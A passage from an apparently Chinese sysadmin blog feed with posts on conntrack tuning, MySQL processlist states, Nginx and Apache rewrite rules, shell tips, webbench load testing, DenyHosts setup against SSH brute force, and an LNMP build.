            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[解决系统日志： kernel: printk: xxxx messages suppressed.问题]]></title>
      <url>/2012/02/27/e8-a7-a3-e5-86-b3-e7-b3-bb-e7-bb-9f-e6-97-a5-e5-bf-97-ef-bc-9a-kernel-printk-xxxx-messages-suppressed-e9-97-ae-e9-a2-98-e8-a7-a3-e5-86-b3-e7-b3-bb-e7-bb-9f-e6-97-a5-e5-bf-97-ef-bc-9a-kernel-prin.html</url>
      <content type="html"><![CDATA[<p><strong>服务器症状:</strong>LAMP架构服务，早上网站打不开，ssh登录连接不上服务器，能ping通，域名能解析</p>
<p><strong>日志截图：</strong></p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2012/02/1.jpg"><img src="http://www.simlinux.com/old/wp-content/uploads/2012/02/1-300x225.jpg" alt="" title="1"></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><strong>分析如下：</strong></p>
<p>此问题出在TCP连接造成，由于安全考虑系统启用了iptables防火墙，有conntrack模块，此模块用于跟踪并且记录连接状态，连接跟踪是防火墙模块的状态检测的基础，一个跟踪连接表会占用350字节的内核存储空间，系统运行时间长时就会把默认的空间填满（IP_conntrack），需要定期清理。</p>
<p><strong>解决方案：</strong></p>
<p>1.加大 ip_conntrack_max 值</p>
<p>vi /etc/sysctl.conf<br>net.ipv4.ip_conntrack_max = 655360</p>
<p>2.降低 ip_conntrack timeout 时间</p>
<p>vi /etc/sysctl.conf<br>net.ipv4.netfilter.ip_conntrack_tcp_timeout_established = 180</p>
<p>#sysctl -p 生效</p>
<p><strong>查看目前 ip_conntrack buffer 使用状况</strong><br>grep conn /proc/slabinfo</p>
<p><strong>查出目前 ip_conntrack 记录最多的前五名 IP</strong><br>cat /proc/net/ip_conntrack | cut -d ‘ ‘ -f 10 | cut -d ‘=’ -f 2 | sort | uniq -c | sort -nr | head -n 5</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[show processlist解析]]></title>
      <url>/2012/02/23/show-processlist-e8-a7-a3-e6-9e-90.html</url>
      <content type="html"><![CDATA[<p>explain来了解SQL执行的状态。<br>explain select * from wp_postsG;<br>使用show status like “Handler_read%”; 来了解索引的效果。<br>Handler_read_key 值高表示索引效果好，Handler_read_rnd_next值高表示索引低效。<br>用show processlist 查看当前运行状态。<br>mysql&gt; show processlist;<br>+—–+————-+——————–+<br>| Id | User | Host | db | Command | Time| State | Info<br>+—–+————-+——————–+<br>|207|root |192.168.0.20:51718 |mytest | Sleep | 5 | | NULL<br>|208|root |192.168.0.20:51719 |mytest | Sleep | 5 | | NULL<br>|220|root |192.168.0.20:51731 |mytest |Query | 84 | Locked |<br>select bookname,culture,value,type from book where id=001<br>先简单说一下各列的含义和用途，第一列，id，不用说了吧，一个标识，你要kill一个语句的时候很有用。user列，显示单前用户，如果不是root，这个命令就只显示你权限范围内的sql语句。host列，显示这个语句是从哪个ip的哪个端口上发出的。呵呵，可以用来追踪出问题语句的用户。db列，显示这个进程目前连接的是哪个数据库。command列，显示当前连接的执行的命令，一般就是休眠（sleep），查询（query），连接（connect）。time列，此这个状态持续的时间，单位是秒。state列，显示使用当前连接的sql语句的状态，很重要的列，后续会有所有的状态的描述，请注意，state只是语句执行中的某一个状态，一个sql语句，已查询为例，可能需要经过copying to tmp table，Sorting result，Sending data等状态才可以完成，info列，显示这个sql语句，因为长度有限，所以长的sql语句就显示不全，但是一个判断问题语句的重要依据。<br>这个命令中最关键的就是state列，mysql列出的状态主要有以下几种：<br>Checking table<br>正在检查数据表（这是自动的）。<br>Closing tables<br>正在将表中修改的数据刷新到磁盘中，同时正在关闭已经用完的表。这是一个很快的操作，如果不是这样的话，就应该确认磁盘空间是否已经满了或者磁盘是否正处于重负中。<br>Connect Out<br>复制从服务器正在连接主服务器。<br>Copying to tmp table on disk<br>由于临时结果集大于 tmp_table_size，正在将临时表从内存存储转为磁盘存储以此节省内存。<br>Creating tmp table<br>正在创建临时表以存放部分查询结果。<br>deleting from main table<br>服务器正在执行多表删除中的第一部分，刚删除第一个表。<br>deleting from reference tables<br>服务器正在执行多表删除中的第二部分，正在删除其他表的记录。<br>Flushing tables<br>正在执行 FLUSH TABLES，等待其他线程关闭数据表。<br>Killed<br>发送了一个kill请求给某线程，那么这个线程将会检查kill标志位，同时会放弃下一个kill请求。MySQL会在每次的主循环中检查kill标志位，不过有些情况下该线程可能会过一小段才能死掉。如果该线程程被其他线程锁住了，那么kill请求会在锁释放时马上生效。<br>Locked<br>被其他查询锁住了。<br>Sending data<br>正在处理 SELECT 查询的记录，同时正在把结果发送给客户端。<br>Sorting for group<br>正在为 GROUP BY 做排序。<br>Sorting for order<br>正在为 ORDER BY 做排序。<br>Opening tables<br>这个过程应该会很快，除非受到其他因素的干扰。例如，在执 ALTER TABLE 或 LOCK TABLE 语句行完以前，数据表无法被其他线程打开。 正尝试打开一个表。<br>Removing duplicates<br>正在执行一个 SELECT DISTINCT 方式的查询，但是MySQL无法在前一个阶段优化掉那些重复的记录。因此，MySQL需要再次去掉重复的记录，然后再把结果发送给客户端。<br>Reopen table<br>获得了对一个表的锁，但是必须在表结构修改之后才能获得这个锁。已经释放锁，关闭数据表，正尝试重新打开数据表。<br>Repair by sorting<br>修复指令正在排序以创建索引。<br>Repair with keycache<br>修复指令正在利用索引缓存一个一个地创建新索引。它会比 Repair by sorting 慢些。<br>Searching rows for update<br>正在讲符合条件的记录找出来以备更新。它必须在 UPDATE 要修改相关的记录之前就完成了。<br>Sleeping<br>正在等待客户端发送新请求.<br>System lock<br>正在等待取得一个外部的系统锁。如果当前没有运行多个 mysqld 服务器同时请求同一个表，那么可以通过增加 –skip-external-locking参数来禁止外部系统锁。<br>Upgrading lock<br>INSERT DELAYED 正在尝试取得一个锁表以插入新记录。<br>Updating<br>正在搜索匹配的记录，并且修改它们。<br>User Lock<br>正在等待 GET_LOCK()。<br>Waiting for tables<br>该线程得到通知，数据表结构已经被修改了，需要重新打开数据表以取得新的结构。然后，为了能的重新打开数据表，必须等到所有其他线程关闭这个表。以下几种情况下会产生这个通知：FLUSH TABLES tbl_name, ALTER TABLE, RENAME TABLE, REPAIR TABLE, ANALYZE TABLE, 或 OPTIMIZE TABLE。<br>waiting for handler insert<br>INSERT DELAYED 已经处理完了所有待处理的插入操作，正在等待新的请求。<br>大部分状态对应很快的操作，只要有一个线程保持同一个状态好几秒钟，那么可能是有问题发生了，需要检查一下。<br>还有其它的状态没在上面中列出来，不过它们大部分只是在查看服务器是否有存在错误是才用得着。</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx 301和apache重定向域名规则方法(多个域名,单个域名)]]></title>
      <url>/2012/02/21/nginx-301-e9-87-8d-e5-ae-9a-e5-90-91-e5-9f-9f-e5-90-8d-e8-a7-84-e5-88-99-e6-96-b9-e6-b3-95-e5-a4-9a-e4-b8-aa-e5-9f-9f-e5-90-8d-e5-8d-95-e4-b8-aa-e5-9f-9f-e5-90-8d-nginx-301-e9-87-8d-e5-ae-9a.html</url>
      <content type="html"><![CDATA[<p>&nbsp;</p>
<p><strong>实例：将所有topsem.com  topsem.cn的域名都跳转到www.topsem.com这个域名，避免泛解析，有利于SEO</strong></p>
<p>server</p>
<p>{</p>
<p>listen 80;</p>
<p>server_name <em>.topsem.com </em>.topsem.cn</p>
<p>index index.html index.php;</p>
<p>root /xxxxx/webroot;</p>
<p>if ($host != ‘www.topsem.com’ ) {</p>
<p>rewrite ^/(.*)$ <a href="http://www.topsem.com/$1" target="_blank" rel="external">http://www.topsem.com/$1</a> permanent;</p>
<p>}</p>
<p>}</p>
<p><strong> apache 重定向</strong></p>
<p>&lt;VirtualHost <em>:80&gt;<br>DocumentRoot /wwwroot/<br>ErrorLog “logs/vhost-error_log”<br>CustomLog “logs/vhost-access_log” common<br>RewriteEngine On<br>RewriteCond %{HTTP_HOST} !^www.teamtop.com$ [NC]<br>RewriteRule ^(.</em>) <a href="http://www.teamtop.com/" target="_blank" rel="external">http://www.teamtop.com/</a> [L,R=301]<br>&lt;/VirtualHost&gt;</p>
<p><strong>注释拓展：</strong></p>
<p>last – 基本上都用这个Flag。</p>
<p>break – 中止Rewirte，不在继续匹配</p>
<p>redirect – 返回临时重定向的HTTP状态302</p>
<p>permanent – 返回永久重定向的HTTP状态301</p>
<p>&nbsp;</p>
<p><strong>nginx rewrite 伪静态配置参数说明（含有实例）</strong></p>
<p>正则表达式匹配，其中：</p>
<ul>
<li><p>~ 为区分大小写匹配</p>
</li>
<li><p>~* 为不区分大小写匹配</p>
</li>
<li><p>!~和!~*分别为区分大小写不匹配及不区分大小写不匹配</p>
</li>
</ul>
<p>文件及目录匹配，其中：</p>
<ul>
<li><p>-f和!-f用来判断是否存在文件</p>
</li>
<li><p>-d和!-d用来判断是否存在目录</p>
</li>
<li><p>-e和!-e用来判断是否存在文件或目录</p>
</li>
<li><p>-x和!-x用来判断文件是否可执行</p>
</li>
</ul>
<p>flag标记有：</p>
<ul>
<li><p>last 相当于Apache里的[L]标记，表示完成rewrite</p>
</li>
<li><p>break 终止匹配, 不再匹配后面的规则</p>
</li>
<li><p>redirect 返回302临时重定向 地址栏会显示跳转后的地址</p>
</li>
<li><p>permanent 返回301永久重定向 地址栏会显示跳转后的地址</p>
</li>
</ul>
<p>一些可用的全局变量有，可以用做条件判断(待补全)</p>
<p>$args</p>
<p>$content_length</p>
<p>$content_type</p>
<p>$document_root</p>
<p>$document_uri</p>
<p>$host</p>
<p>$http_user_agent</p>
<p>$http_cookie</p>
<p>$limit_rate</p>
<p>$request_body_file</p>
<p>$request_method</p>
<p>$remote_addr</p>
<p>$remote_port</p>
<p>$remote_user</p>
<p>$request_filename</p>
<p>$request_uri</p>
<p>$query_string</p>
<p>$scheme</p>
<p>$server_protocol</p>
<p>$server_addr</p>
<p>$server_name</p>
<p>$server_port</p>
<p>$uri</p>
<p><strong>结合QeePHP的例子</strong></p>
<p>if (!-d $request_filename) {</p>
<p>rewrite ^/([a-z-A-Z]+)/([a-z-A-Z]+)/?(.*)$ /index.php?namespace=user&amp;controller=$1&amp;action=$2&amp;$3 last;</p>
<p>rewrite ^/([a-z-A-Z]+)/?$ /index.php?namespace=user&amp;controller=$1 last;</p>
<p>break;</p>
<p><strong>多目录转成参数</strong></p>
<p>abc.domian.com/sort/2 =&gt; abc.domian.com/index.php?act=sort&amp;name=abc&amp;id=2</p>
<p>if ($host ~<em> (.</em>).domain.com) {</p>
<p>set $sub_name $1;</p>
<p>rewrite ^/sort/(d+)/?$ /index.php?act=sort&amp;cid=$sub_name&amp;id=$1 last;</p>
<p>}</p>
<p><strong>目录对换</strong></p>
<p>/123456/xxxx -&gt; /xxxx?id=123456</p>
<p>rewrite ^/(d+)/(.+)/ /$2?id=$1 last;</p>
<p>例如下面设定nginx在用户使用ie的使用重定向到/nginx-ie目录下：</p>
<p>if ($http_user_agent ~ MSIE) {</p>
<p>rewrite ^(.*)$ /nginx-ie/$1 break;</p>
<p>}</p>
<p><strong>目录自动加“/”</strong></p>
<p>if (-d $request_filename){</p>
<p>rewrite ^/(.*)([^/])$ <a href="http://$host/$1$2/" target="_blank" rel="external">http://$host/$1$2/</a> permanent;</p>
<p>}</p>
<p><strong>禁止htaccess</strong></p>
<p>location ~/.ht {</p>
<p>deny all;</p>
<p>}</p>
<p><strong>禁止多个目录</strong></p>
<p>location ~ ^/(cron|templates)/ {</p>
<p>deny all;</p>
<p>break;</p>
<p>}</p>
<p><strong>禁止以/data开头的文件</strong></p>
<p>可以禁止/data/下多级目录下.log.txt等请求;</p>
<p>location ~ ^/data {</p>
<p>deny all;</p>
<p>}</p>
<p><strong>禁止单个目录</strong></p>
<p>不能禁止.log.txt能请求</p>
<p>location /searchword/cron/ {</p>
<p>deny all;</p>
<p>}</p>
<p><strong>禁止单个文件</strong></p>
<p>location ~ /data/sql/data.sql {</p>
<p>deny all;</p>
<p>}</p>
<p><strong>给favicon.ico和robots.txt设置过期时间;</strong></p>
<p>这里为favicon.ico为99 天,robots.txt为7天并不记录404错误日志</p>
<p>location ~(favicon.ico) {</p>
<p>log_not_found off;</p>
<p>expires 99d;</p>
<p>break;</p>
<p>}</p>
<p>location ~(robots.txt) {</p>
<p>log_not_found off;</p>
<p>expires 7d;</p>
<p>break;</p>
<p>}</p>
<p><strong>设定某个文件的过期时间;这里为600秒，并不记录访问日志</strong></p>
<p>location ^~ /html/scripts/loadhead_1.js {</p>
<p>access_log off;</p>
<p>root /opt/lampp/htdocs/web;</p>
<p>expires 600;</p>
<p>break;</p>
<p>}</p>
<p><strong>文件反盗链并设置过期时间</strong></p>
<p>这里的return 412 为自定义的http状态码，默认为403，方便找出正确的盗链的请求</p>
<p>“rewrite ^/ <a href="http://leech.c1gstudio.com/leech.gif;”显示一张防盗链图片" target="_blank" rel="external">http://leech.c1gstudio.com/leech.gif;”显示一张防盗链图片</a></p>
<p>“access_log off;”不记录访问日志，减轻压力</p>
<p>“expires 3d”所有文件3天的浏览器缓存</p>
<p>location ~* ^.+.(jpg|jpeg|gif|png|swf|rar|zip|css|js)$ {</p>
<p>valid_referers none blocked <em>.c1gstudio.com </em>.c1gstudio.net localhost 208.97.167.194;</p>
<p>if ($invalid_referer) {</p>
<p>rewrite ^/ <a href="http://leech.c1gstudio.com/leech.gif" target="_blank" rel="external">http://leech.c1gstudio.com/leech.gif</a>;</p>
<p>return 412;</p>
<p>break;</p>
<p>}</p>
<p>access_log off;</p>
<p>root /opt/lampp/htdocs/web;</p>
<p>expires 3d;</p>
<p>break;</p>
<p>}</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Nginx正则表达式 </tag>
            
            <tag> Nginx重定向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 常用技巧脚本分享]]></title>
      <url>/2012/02/20/linux-e5-b8-b8-e7-94-a8-e6-8a-80-e5-b7-a7-e8-84-9a-e6-9c-ac-e5-88-86-e4-ba-ab.html</url>
      <content type="html"><![CDATA[<p>1.按内存从大到小排列进程:<br>ps -eo “%C : %p : %z : %a”|sort -k5 -nr</p>
<p>2.查看当前有哪些进程；查看进程打开的文件:<br>ps -A ；lsof -p PID</p>
<p>3.获取当前IP地址（从中学习grep,awk,cut的作用）<br>ifconfig eth0 |grep “inet addr:” |awk ‘{print $2}’|cut -c 6-</p>
<p>4.统计每个单词出现的频率，并排序<br>awk ‘{arr[$1]+=1 }END{for(i in arr){print arr”t”i}}’ 文件名 | sort -rn</p>
<p>5.显示10条最常用的命令<br>sed -e “s/| /n/g” ~/.bash_history | cut -d ‘ ‘ -f 1 | sort | uniq -c | sort -nr | head</p>
<p>6.杀死Nginx进程(杀死某一进程)<br>ps -ef|grep -v grep |grep nginx|awk ‘{print $2}’ 或<br>for i in <code>ps aux | grep nginx | grep -v grep | awk {&#39;print $2&#39;}</code> ; do kill $i; done</p>
<p>7.列出当前文件夹目录大小，以G，M，K显示。<br>du -b –max-depth 1 | sort -nr | perl -pe ‘s{([0-9]+)}{sprintf”%.1f%s”, $1&gt;=2<strong>30? ($1/2</strong>30, “G”): $1&gt;=2<strong>20? ($1/2</strong>20, “M”):$1&gt;=2<strong>10? ($1/2</strong>10, “K”): ($1, “”)}e’</p>
<p>shaw答案 ：du -hs $(du -sk ./<code>ls -F |grep /</code> |sort -nr |awk ‘{print $NF}’)<br>也可 以实现，不过不是特别完美。但好记。</p>
<p>8.清空linux buffer cache<br>sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches</p>
<p>9.将当前目录文件名全部转换成小写<br>for i in *; do mv “$i” “$(echo $i|tr A-Z a-z)”; done</p>
<p>10.消除vim中的^M的几种方法<br>1)dos2uninx filename<br>2)sed -e ‘s/^M//‘ filename<br>3)vim中 :s/^M//gc<br>4)col -bx &lt; dosfile &gt; newfile<br>5)tr -s “rn” “n” &lt; file &gt; newfile</p>
<p>11. 清除所有arp缓存<br>arp -n|awk ‘/^[1-9]/ {print “arp -d “$1}’|sh</p>
<p>12. 绑定已知机器的arp地址<br>cat /proc/net/arp | awk ‘{print $1 “ “ $4}’ |sort -t. -n +3 -4 &gt; /etc/ethers</p>
<p>13. perl -ne ‘m/^([^#][^s=]+)s<em>(=.</em>|)/ &amp;&amp; printf(“%-35s%sn”, $1, $2)’ /etc/my.cnf</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx应用案例分享：压力测试]]></title>
      <url>/2012/02/16/nginx-e5-ba-94-e7-94-a8-e6-a1-88-e4-be-8b-e5-88-86-e4-ba-ab-ef-bc-9a-e5-8e-8b-e5-8a-9b-e6-b5-8b-e8-af-95.html</url>
      <content type="html"><![CDATA[<p>在运维工作中，压力测试是一项非常重要的工作。比如在一个网站上线之前，能承受多大访问量、在大访问量情况下性能怎样，这些数据指标好坏将会直接影响用户体验。</p>
<p>但是，在压力测试中存在一个共性，那就是压力测试的结果与实际负载结果不会完全相同，就算压力测试工作做的再好，也不能保证100%和线上性能指标相同。面对这些问题，我们只能尽量去想方设法去模拟。所以，压力测试非常有必要，有了这些数据，我们就能对自己做维护的平台做到心中有数。</p>
<p>目前较为常见的网站压力测试工具有webbench、ab（apache bench）、tcpcopy、loadrunner</p>
<p><table width="500" border="1" cellspacing="0" cellpadding="0" align="center"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><div>软件名称</div></p>
<p><td></td></p>
<p><div>简介</div></p>
<p><td></td></p>
<p><div>优缺点</div><br></p>
<p><tr></tr></p>
<p><td></td></p>
<p><div>webbench</div></p>
<p><td></td></p>
<p><div>由Lionbridge公司开发，主要测试每秒钟请求数和每秒钟数据传输量，同时支持静态、动态、SSL</div></p>
<p><div> </div></p>
<p><td></td></p>
<p><div>部署简单，静动态均可测试。适用于小型网站压力测试（单例最多可模拟3万并发）</div><br></p>
<p><tr></tr></p>
<p><td></td></p>
<p><div>ab（apache bench）</div></p>
<p><td></td></p>
<p><div>Apache自带的压力测试工具，主要功能用于测试网站每秒钟处理请求个数</div></p>
<p><div> </div></p>
<p><td></td></p>
<p><div>多见用于静态压力测试，功能较弱，非专业压力测试工具</div><br></p>
<p><tr></tr></p>
<p><td></td></p>
<p><div>tcpcopy</div></p>
<p><td></td></p>
<p><div>基于底层应用请求复制，可转发各种在线请求到测试服务器，具有分布式压力测试功能，所测试数据与实际生产数据较为接近</div></p>
<p><td>后起之秀，主要用于中大型压力测试，所有基于 tcp的packets均可测试</td><br></p>
<p><tr></tr></p>
<p><td></td></p>
<p><div>loadrunner</div></p>
<p><td></td></p>
<p><div>压力测试界的泰斗，可以创建虚拟用户，可以模拟用户真实访问流程从而录制成脚本，其测试结果也最为逼真</div></p>
<p><td></td></p>
<p><div>模拟最为逼真，并可进行独立的单元测试，但是部署配置较为复杂，需要专业人员才可以。</div><br><br><br><br>下面，笔者就以webbench为例，来讲解一下网站在上线之前压力测试是如何做的。</p>
<p><strong>安装webbench</strong></p>
<p><pre>#wget <a href="http://home.tiscali.cz/~cz210552/distfiles/webbench-1.5.tar.gz" target="_blank" rel="external">http://home.tiscali.cz/~cz210552/distfiles/webbench-1.5.tar.gz</a></pre></p>
<p>#tar zxvf webbench-1.5.tar.gz</p>
<p>#cd webbench-1.5</p>
<p>#make &amp;&amp; make install<br><strong>进行压力测试</strong></p>
<p>并发200时</p>
<p><pre># webbench -c 200 -t 60 <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a></pre><br>参数解释：-c为并发数，-t为时间（秒）</p>
<p><pre>Webbench - Simple Web Benchmark 1.5<br>Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.<br>Benchmarking: GET <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a><br>200 clients, running 60 sec.<br>Speed=1454 pages/min, 2153340 bytes/sec.<br>Requests: 1454 susceed, 0 failed.</pre><br>当并发200时，网站访问速度正常</p>
<p>并发800时</p>
<p><pre>#webbench -c 800 -t 60 <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a><br>Webbench - Simple Web Benchmark 1.5<br>Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.<br>Benchmarking: GET <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a><br>800 clients, running 60 sec.<br>Speed=1194 pages/min, 2057881 bytes/sec.<br>Requests: 1185 susceed, 9 failed.</pre><br>当并发连接为800时，网站访问速度稍慢</p>
<p>并发1600时</p>
<p><pre>#webbench -c 1600 -t 60 <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a><br>Webbench - Simple Web Benchmark 1.5<br>Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.<br>Benchmarking: GET <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a><br>1600 clients, running 60 sec.<br>Speed=1256 pages/min, 1983506 bytes/sec.<br>Requests: 1183 susceed, 73 failed.</pre><br>当并发连接为1600时，网站访问速度便非常慢了</p>
<p>并发2000时</p>
<p><pre>#webbench -c 2000 -t 60 <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a><br>Webbench - Simple Web Benchmark 1.5<br>Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.<br>Benchmarking: GET <a href="http://blog.luwenju.com/index.php" target="_blank" rel="external">http://blog.luwenju.com/index.php</a><br>2000 clients, running 60 sec.<br>Speed=2154 pages/min, 1968292 bytes/sec.<br>Requests: 2076 susceed, 78 failed.</pre><br>当并发2000时，网站便出现“502 Bad Gateway”，由此可见web服务器已无法再处理用户访问请求</p>
<p>总结：</p>
<p>1、压力测试工作应该放到产品上线之前，而不是上线以后</p>
<p>2、测试时尽量跨公网进行，而不是内网</p>
<p>3、测试时并发应当由小逐渐加大，比如并发100时观察一下网站负载是多少、打开是否流程，并发200时又是多少、网站打开缓慢时并发是多少、网站打不开时并发又是多少</p>
<p>4、 应尽量进行单元测试，如B2C网站可以着重测试购物车、推广页面等，因为这些页面占整个网站访问量比重较大</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[最有效阻止SSH暴力破解的方法]]></title>
      <url>/2012/02/10/e6-9c-80-e6-9c-89-e6-95-88-e9-98-bb-e6-ad-a2ssh-e6-9a-b4-e5-8a-9b-e7-a0-b4-e8-a7-a3-e7-9a-84-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>最有效阻止SSH暴力破解的方法<br>(DenyHosts)<br>【前言】 服务器每天都会有无数的SSH失败尝试记录，有些无聊的人一直不停的扫描，这些人真够无聊的，没事吃饱了撑着，老找些软件在那里穷举扫描,所以大家第一要记的设置一个好的够复杂的密码。<br>怎么样防,如果要一条一条将这些IP阻止显然治标不治本，还好有DenyHosts软件来代替我们手搞定他</p>
<p>DenyHosts是Python语言写的一个程序，它会分析sshd的日志文件，当发现重复的攻击时就会记录IP到/etc/hosts.deny文件，从而达到自动屏IP的功能。<br>DenyHosts官方网站为：<a href="http://denyhosts.sourceforge.net" target="_blank" rel="external">http://denyhosts.sourceforge.net</a><br>以下是安装记录（以CentOS 5.3, DenyHosts 2.6 为例）<br>【第一步】下载、解压:</p>
<h1 id="cd-usr-local-src"><a href="#cd-usr-local-src" class="headerlink" title="cd /usr/local/src"></a>cd /usr/local/src</h1><p>最新下载地址如下：</p>
<h1 id="wget-http-www-sfr-fresh-com-unix-privat-DenyHosts-2-6-tar-gz"><a href="#wget-http-www-sfr-fresh-com-unix-privat-DenyHosts-2-6-tar-gz" class="headerlink" title="wget http://www.sfr-fresh.com/unix/privat/DenyHosts-2.6.tar.gz"></a>wget <a href="http://www.sfr-fresh.com/unix/privat/DenyHosts-2.6.tar.gz" target="_blank" rel="external">http://www.sfr-fresh.com/unix/privat/DenyHosts-2.6.tar.gz</a></h1><h1 id="tar-zxvf-DenyHosts-2-6-tar-gz"><a href="#tar-zxvf-DenyHosts-2-6-tar-gz" class="headerlink" title="tar -zxvf DenyHosts-2.6.tar.gz"></a>tar -zxvf DenyHosts-2.6.tar.gz</h1><h1 id="cd-DenyHosts-2-6"><a href="#cd-DenyHosts-2-6" class="headerlink" title="cd DenyHosts-2.6"></a>cd DenyHosts-2.6</h1><p>【第二步】安装工具:</p>
<h1 id="python-setup-py-install"><a href="#python-setup-py-install" class="headerlink" title="python setup.py install"></a>python setup.py install</h1><p>默认是安装到/usr/share/denyhosts目录<br>【第三步】配置启动:<br>设置启动脚本</p>
<h1 id="cp-daemon-control-dist-daemon-control"><a href="#cp-daemon-control-dist-daemon-control" class="headerlink" title="cp daemon-control-dist daemon-control"></a>cp daemon-control-dist daemon-control</h1><h1 id="chown-root-daemon-control"><a href="#chown-root-daemon-control" class="headerlink" title="chown root daemon-control"></a>chown root daemon-control</h1><h1 id="chmod-700-daemon-control"><a href="#chmod-700-daemon-control" class="headerlink" title="chmod 700 daemon-control"></a>chmod 700 daemon-control</h1><p>完了之后执行daemon-contron start就可以了。</p>
<h1 id="daemon-control-start"><a href="#daemon-control-start" class="headerlink" title="./daemon-control start"></a>./daemon-control start</h1><p>如果要使DenyHosts每次重起后自动启动还需做如下设置：</p>
<h1 id="cd-etc-init-d"><a href="#cd-etc-init-d" class="headerlink" title="cd /etc/init.d"></a>cd /etc/init.d</h1><h1 id="ln-s-usr-share-denyhosts-daemon-control-denyhost"><a href="#ln-s-usr-share-denyhosts-daemon-control-denyhost" class="headerlink" title="ln -s /usr/share/denyhosts/daemon-control denyhost"></a>ln -s /usr/share/denyhosts/daemon-control denyhost</h1><h1 id="chkconfig-–add-denyhost"><a href="#chkconfig-–add-denyhost" class="headerlink" title="chkconfig –add denyhost"></a>chkconfig –add denyhost</h1><h1 id="chkconfig-–level-345-denyhost-on"><a href="#chkconfig-–level-345-denyhost-on" class="headerlink" title="chkconfig –level 345 denyhost on"></a>chkconfig –level 345 denyhost on</h1><p>或者修改/etc/rc.local文件：</p>
<h1 id="vi-etc-rc-local"><a href="#vi-etc-rc-local" class="headerlink" title="vi /etc/rc.local"></a>vi /etc/rc.local</h1><p>加入下面这条命令<br>/usr/share/denyhosts/daemon-control start<br>配置文件：</p>
<p>【第四步】编辑文件：<br>DenyHosts</p>
<p>ln -s /usr/share/denyhosts/denyhosts.cfg /etc/</p>
<p>vi /etc/denyhosts.cfg</p>
<p>SECURE_LOG = /var/log/secure</p>
<p>#ssh 日志文件，它是根据这个文件来判断的。</p>
<p>HOSTS_DENY = /etc/hosts.deny</p>
<p>#控制用户登陆的文件</p>
<p>PURGE_DENY = 5m</p>
<p>#过多久后清除已经禁止的</p>
<p>BLOCK_SERVICE = sshd</p>
<p>#禁止的服务名</p>
<p>DENY_THRESHOLD_INVALID = 1</p>
<p>#允许无效用户失败的次数</p>
<p>DENY_THRESHOLD_VALID = 10</p>
<p>#允许普通用户登陆失败的次数</p>
<p>DENY_THRESHOLD_ROOT = 5</p>
<p>#允许root登陆失败的次数</p>
<p>HOSTNAME_LOOKUP=NO</p>
<p>#是否做域名反解</p>
<p>ADMIN_EMAIL = 123456@163.com</p>
<p>#管理员邮件地址,它会给管理员发邮件</p>
<p>DAEMON_LOG = /var/log/denyhosts</p>
<p>#自己的日志文件</p>
<p>然后就可以启动了：</p>
<p>service denyhost restart<br>【最后】测试:<br>看看/etc/hosts.deny内是否有禁止的ＩＰ，有的话说明配置成功</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[在rhel6 64位环境下部署LNMP环境]]></title>
      <url>/2012/02/08/83.html</url>
      <content type="html"><![CDATA[<p><strong>实验目的</strong>：应用Nginx网页服务器，掌握LNMP基本架构<br><strong>实验前提：</strong>此实验除Nginx和php需要重新编译外，其他相关软件与LAMP安装方式相同，故删除之前LAMP架构中的Apache和PHP，编译安装Nginx和PHP<br><strong>实验环境：</strong>RHEL61_64   nginx-1.0.9   php-5.2.17<br><strong>内核版本：</strong>2.6.32-131.0.15.el6.x86_64<br><strong>实验步骤：</strong><br><strong>1.Nginx-1.0.9 编译安装</strong><br>./configure –prefix=/usr/local/nginx –user=daemon –group=daemon –with-rtsig_module –with-select_module –with-poll_module<br>–with-file-aio –with-http_ssl_module –with-http_realip_module<br>–with-http_addition_module –with-http_image_filter_module –with-http_sub_module –with-http_dav_module –with-http_flv_module –with-http_mp4_module –with-http_gzip_static_module –with-http_random_index_module –with-http_secure_link_module –with-http_degradation_module  –http-log-path=/var/log/nginx/access.log –error-log-path=/var/log/nginx/error.log –pid-path=/var/run/nignx/nginx.pid –http-client-body-temp-path=/tmp/nginx_http –http-proxy-temp-path=/tmp/nginx_proxy –http-fastcgi-temp-path=/tmp/nginx_fcgi –with-cpu-opt=pentium4  –without-http_uwsgi_module  –without-http_scgi_module  –with-http_stub_status_module –with-http_perl_module –with-perl=/usr/bin/perl  –with-perl_modules_path=/usr/share/perl5  –with-pcre</p>
